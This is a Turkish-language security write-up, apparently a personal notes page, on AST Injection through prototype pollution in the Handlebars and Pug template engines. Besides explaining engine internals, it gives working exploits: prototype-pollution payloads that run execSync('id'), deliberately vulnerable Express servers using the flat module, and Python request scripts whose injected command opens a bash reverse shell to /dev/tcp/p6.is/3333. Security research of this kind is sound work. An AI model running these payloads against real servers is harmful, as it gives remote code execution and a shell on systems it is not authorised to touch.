---
{"dg-publish":true,"permalink":"/baglantilar/ast-injection/"}
---

Bu makalede, AST Injection adı verilen yeni bir teknik kullanılarak iki iyi bilinen template motorunda RCE'nin nasıl tetikleneceği anlatılmaktadır.

[[Bağlantılar/What is AST\|What is AST]] ?

### AST in NodeJS

![Pasted image 20250129200158.png](/img/user/resimler/Pasted%20image%2020250129200158.png)

NodeJS'de AST, JS'de template motorları ve typescript vb. olarak gerçekten sık kullanılır. Template engine için yapı yukarıda gösterildiği gibidir.

![Pasted image 20250129200320.png](/img/user/resimler/Pasted%20image%2020250129200320.png)

Eğer bir JavaScript uygulamasında prototype pollution güvenlik açığı varsa, **Parser** veya **Compiler** süreci sırasında bir fonksiyona herhangi bir AST (Soyut Sözdizim Ağacı) eklenebilir.

Bu durumda, doğru şekilde filtrelenmemiş veya **lexer** ya da **parser** tarafından doğrulanmamış girişler kullanılarak AST eklenebilir. Böylece derleyiciye beklenmedik girişler sağlayabiliriz.

Aşağıda, **handlebars** ve **pug** template motorlarında **AST Injection** kullanılarak rastgele komutların nasıl çalıştırılabileceği gösterilmektedir.


### Handlebars

![Pasted image 20250129200529.png](/img/user/resimler/Pasted%20image%2020250129200529.png)

Bugüne kadar Handlebars toplamda 998.602.213 kez indirilmiştir.  
Handlebars, **ejs** dışında en yaygın kullanılan template motorudur.

Yeni sürümlerinde, herhangi bir template eklenebilse bile hiçbir komut çalıştırılamayacağı için güvenli olduğu bilinmektedir.


### Nasıl Tespit Edilir

```
const Handlebars = require('handlebars');  
  
const source = `Hello {{ msg }}`;  
const template = Handlebars.compile(source);  
  
console.log(template({"msg": "posix"})); // Hello posix
```

Başlamadan önce, Template'leri Handlebar'da nasıl kullanacağınızı açıklayalım. Handlebar.compile fonksiyonu bir stringi bir template fonksiyonuna dönüştürür ve referans için object factors geçirir.

```
const Handlebars = require('handlebars');  
  
Object.prototype.pendingContent = `<script>alert(origin)</script>`  
  
const source = `Hello {{ msg }}`;  
const template = Handlebars.compile(source);  
  
console.log(template({"msg": "posix"})); // <script>alert(origin)</script>Hello posix
```


Burada, prototip kirlenmesi kullanarak derleme sürecini etkileyebiliriz.

Herhangi bir string'i `Object.prototype.pendingContent`'e ekleyerek bir saldırının mümkün olup olmadığını belirleyebilirsiniz.  
Bu, prototip kirlenmesi bulunduğunda, sunucuların **handlebars** motorunu kullandığından emin olmanızı sağlar, özellikle siyah kutu (black-box) ortamlarında.

```
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
	if (this.pendingContent) {
		content = this.pendingContent + content;
	} else {
		this.pendingLocation = this.source.currentLocation;
	}

	this.pendingContent = content;
},
pushSource: function pushSource(source) {
	if (this.pendingContent) {
		this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
		this.pendingContent = undefined;
	}

	if (source) {
		this.source.push(source);
	}
}
...


```

Bu işlem, **javascript-compiler.js** dosyasındaki `appendContent` fonksiyonu tarafından yapılır.  
`appendContent` şu şekilde çalışır: Eğer `pendingContent` mevcutsa, içeriğe ekler ve geri döner.

`pushSource`, `pendingContent`'i **undefined** yaparak, string'in birden fazla kez eklenmesini engeller.

### Exploit

![Pasted image 20250129201003.png](/img/user/resimler/Pasted%20image%2020250129201003.png)


Handlebars yukarıdaki grafikte gösterildiği gibi çalışır. 

Lexer ve parser AST oluşturduktan sonra, compiler.js'ye geçer Derleyicinin bazı argümanlarla oluşturduğu template fonksiyonunu çalıştırabiliriz. ve “Hello posix” gibi bir string döndürür (msg posix olduğunda)

```
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
    this.$ = { type: 'NumberLiteral', value: Number($[$0]), original: Number($[$0]), loc: yy.locInfo(this._$) };
    break;


```

Handlebars'taki parser, türü NumberLiteral olan bir node'un değerini Number constructor aracılığıyla her zaman bir sayı olmaya zorlar. Ancak prototype pollution kullanarak buraya sayısal olmayan bir string ekleyebilirsiniz.

```
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
  // Just return if an already-compiled AST was passed in.
  if (input.type === 'Program') {
    return input;
  }

  _parser2['default'].yy = yy;

  // Altering the shared object here, but this is ok as parser is a sync operation
  yy.locInfo = function (locInfo) {
    return new yy.SourceLocation(options && options.srcName, locInfo);
  };

  var ast = _parser2['default'].parse(input);

  return ast;
}

function parse(input, options) {
  var ast = parseWithoutProcessing(input, options);
  var strip = new _whitespaceControl2['default'](options);

  return strip.accept(ast);
}


```

İlk olarak, file fonksiyonuna bakın ve iki girdi yolunu destekler: AST Object ve template string.

input.type bir Program olduğunda, girdi değeri aslında string olmasına rağmen. Parser, bunun zaten parser.js tarafından ayrıştırılmış AST olduğunu düşünür ve herhangi bir işlem yapmadan derleyiciye gönderir.

```
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
    /* istanbul ignore next: Sanity code */
    if (!this[node.type]) {
        throw new _exception2['default']('Unknown type: ' + node.type, node);
    }

    this.sourceNode.unshift(node);
    var ret = this[node.type](node);
    this.sourceNode.shift();
    return ret;
},
Program: function Program(program) {
    console.log((new Error).stack)
    this.options.blockParams.unshift(program.blockParams);

    var body = program.body,
        bodyLength = body.length;
    for (var i = 0; i < bodyLength; i++) {
        this.accept(body[i]);
    }

    this.options.blockParams.shift();

    this.isSimple = bodyLength === 1;
    this.blockParams = program.blockParams ? program.blockParams.length : 0;

    return this;
}
...


```

AST Object (aslında bir string) verilen derleyici bunu accept metoduna gönderir ve accept, Compiler'ın this[node.type]'ını çağırır. Daha sonra AST'nin body özelliğini alır ve bunu fonksiyon oluşturmak için kullanır

```
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
        "type": "NumberLiteral",
        "value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
    }],
    "loc": {
        "start": 0,
        "end": 0
    }
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
    var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
            return parent[propertyName];
        }
        return undefined
    };

    return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
        "name": "undefined",
        "hash": {},
        "data": data,
        "loc": {
            "start": 0,
            "end": 0
        }
    })) != null ? stack1 : "");
}
*/


```

Sonuç olarak, bir saldırı şu şekilde yapılandırılabilir. Parser'dan geçtiyseniz, NumberLiteral'ın değerine atanamayacak bir string belirtin. Ancak Injected AST işlendiğinde, fonksiyona herhangi bir kod ekleyebiliriz.

### Example

```
const express = require('express');
const { unflatten } = require('flat');
const bodyParser = require('body-parser');
const Handlebars  = require('handlebars');
 
const app = express();
app.use(bodyParser.json())

app.get('/', function (req, res) {
    var source = "<h1>It works!</h1>";
    var template = Handlebars.compile(source);
    res.end(template({}));
});

app.post('/vulnerable', function (req, res) {
    let object = unflatten(req.body);
    res.json(object);
});
 
app.listen(3000);


```

Prototype pollution güvenlik açığına sahip flat modül kullanarak güvenlik açığı olan bir sunucuyu yapılandırma örneği.

![Pasted image 20250129201552.png](/img/user/resimler/Pasted%20image%2020250129201552.png)

Flat, haftada 4.61 milyon indirme ile popüler bir modüldür ve bildirilen Prototype pollution güvenlik açığı için yama henüz yapılmamıştır.

https://github.com/hughsk/flat/issues/105

```
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

# execute
requests.get(TARGET_URL)


```


![Pasted image 20250129201704.png](/img/user/resimler/Pasted%20image%2020250129201704.png)

Değeri içine herhangi bir komut ekleyerek shell elde edebiliriz.


## Pug

![Pasted image 20250129201745.png](/img/user/resimler/Pasted%20image%2020250129201745.png)

Bugüne kadar bu pug toplam 65,827,719 kez indirilmiştir. pug daha önce jade adı altında geliştirilmiş ve ismi değiştirilmiş bir modüldür. İstatistiklere göre nodejs'deki en popüler 4. template motorudur.


### How to Detect

```
const pug = require('pug');

const source = `h1= msg`;

var fn = pug.compile(source);
var html = fn({msg: 'It works'});

console.log(html); // <h1>It works</h1>


```

Bir pug'da template kullanmanın yaygın bir yolu yukarıdaki gibidir. pug.compile fonksiyonu bir stringi bir template fonksiyonuna dönüştürür ve referans için objeyi geçirir.

```
const pug = require('pug');

Object.prototype.block = {"type":"Text","val":`<script>alert(origin)</script>`};

const source = `h1= msg`;

var fn = pug.compile(source, {});
var html = fn({msg: 'It works'});

console.log(html); // <h1>It works<script>alert(origin)</script></h1>


```

Prototype pollution kullanarak black-box ortamında pug template engine kullanımını kontrol etmek için bir yöntemdir. Object.prototype.block içerisine AST eklediğinizde derleyici bunu val'e atıfta bulunarak buffer'a ekler.

```
switch (ast.type) {
    case 'NamedBlock':
    case 'Block':
        ast.nodes = walkAndMergeNodes(ast.nodes);
        break;
    case 'Case':
    case 'Filter':
    case 'Mixin':
    case 'Tag':
    case 'InterpolatedTag':
    case 'When':
    case 'Code':
    case 'While':
        if (ast.block) {
        ast.block = walkAST(ast.block, before, after, options);
        }
        break;
    ...


```

`ast.type` "While" olduğunda, `ast.block` ile `walkASK` fonksiyonu çağrılır (değer mevcut değilse prototipe başvurur).  

Eğer template, argümandan herhangi bir değeri referans alıyorsa, **While** node'u her zaman mevcut olur, bu nedenle güvenilirlik oldukça yüksektir.

Aslında, eğer geliştirici template'den herhangi bir değeri argümandan referans almak zorunda kalmasaydı, başta template motorlarını kullanmazlardı.


### Exploit

![Pasted image 20250129202202.png](/img/user/resimler/Pasted%20image%2020250129202202.png)

* Pug, yukarıdaki grafikte gösterildiği gibi çalışır.  
* Handlebars'tan farklı olarak, her process ayrı bir modüle ayrılmıştır.  
* Pug-parser tarafından oluşturulan AST, pug-code-gen'e aktarılır ve bir fonksiyona dönüştürülür.  
* Son olarak, bu fonksiyon çalıştırılır.

```
<!-- /node_modules/pug-code-gen/index.js -->

if (debug && node.debug !== false && node.type !== 'Block') {
    if (node.line) {
        var js = ';pug_debug_line = ' + node.line;
        if (node.filename)
            js += ';pug_debug_filename = ' + stringify(node.filename);
        this.buf.push(js + ';');
    }
}


```

Pug derleyicisinde, hata ayıklama için satır numarasını saklayan **pug_debug_line** adlı bir değişken bulunur.  

Eğer `node.line` değeri varsa, bu değer tampon (buffer) eklenir, aksi takdirde geçilir.

Pug-parser ile oluşturulan AST için, `node.line` değeri her zaman bir tamsayı olarak belirtilir.  
Ancak, **AST Injection** kullanarak `node.line`'a bir string ekleyebiliriz ve bu da rastgele kod çalıştırılmasına yol açabilir.

```
const pug = require('pug');

Object.prototype.block = {"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync('id').toString())"};

const source = `h1= msg`;

var fn = pug.compile(source, {});
console.log(fn.toString());

/*
function template(locals) {
    var pug_html = "",
        pug_mixins = {},
        pug_interp;
    var pug_debug_filename, pug_debug_line;
    try {;
        var locals_for_with = (locals || {});

        (function (console, msg, process) {;
            pug_debug_line = 1;
            pug_html = pug_html + "\u003Ch1\u003E";;
            pug_debug_line = 1;
            pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? "" : pug_interp));;
            pug_debug_line = console.log(process.mainModule.require('child_process').execSync('id').toString());
            pug_html = pug_html + "ndefine\u003C\u002Fh1\u003E";
        }.call(this, "console" in locals_for_with ?
            locals_for_with.console :
            typeof console !== 'undefined' ? console : undefined, "msg" in locals_for_with ?
            locals_for_with.msg :
            typeof msg !== 'undefined' ? msg : undefined, "process" in locals_for_with ?
            locals_for_with.process :
            typeof process !== 'undefined' ? process : undefined));;
    } catch (err) {
        pug.rethrow(err, pug_debug_filename, pug_debug_line);
    };
    return pug_html;
}
*/


```

Oluşturulan bir fonksiyon örneği.  
Burada, **Object.prototype.line** değeri, **pug_debug_line** tanımının sağ tarafına eklenmiştir. 

```
const pug = require('pug');

Object.prototype.block = {"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync('id').toString())"};

const source = `h1= msg`;

var fn = pug.compile(source);
var html = fn({msg: 'It works'});

console.log(html); // "uid=0(root) gid=0(root) groups=0(root)\n\n<h1>It worksndefine</h1>"

```

Sonuç olarak, bir saldırı şu şekilde yapılandırılabilir.  
Parser tarafından her zaman sayı olarak tanımlanan `node.line` değerine bir string belirterek, fonksiyona herhangi bir komut eklenebilir.


### Example

```
const express = require('express');
const { unflatten } = require('flat');
const pug = require('pug');

const app = express();
app.use(require('body-parser').json())

app.get('/', function (req, res) {
    const template = pug.compile(`h1= msg`);
    res.end(template({msg: 'It works'}));
});

app.post('/vulnerable', function (req, res) {
    let object = unflatten(req.body);
    res.json(object);
});
 
app.listen(3000);


```

Handlebars örneğinde olduğu gibi, sunucu yapılandırmak için **flat** kullanılmıştır.  
Template engine **pug** olarak değiştirilmiştir.

```
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
})

# execute
requests.get(TARGET_URL)


```

![Pasted image 20250129202549.png](/img/user/resimler/Pasted%20image%2020250129202549.png)

Block.line içine herhangi bir kod ekleyebilir ve bir shell elde edebiliriz.

Sonuç olarak, **JS template motorlarında** AST Injection kullanarak nasıl rastgele komut çalıştırılabileceğini açıkladım.

Aslında bu kısımların tamamen düzeltilmesi çok zor Bu yüzden bunun EJS gibi kalmasını bekliyorum.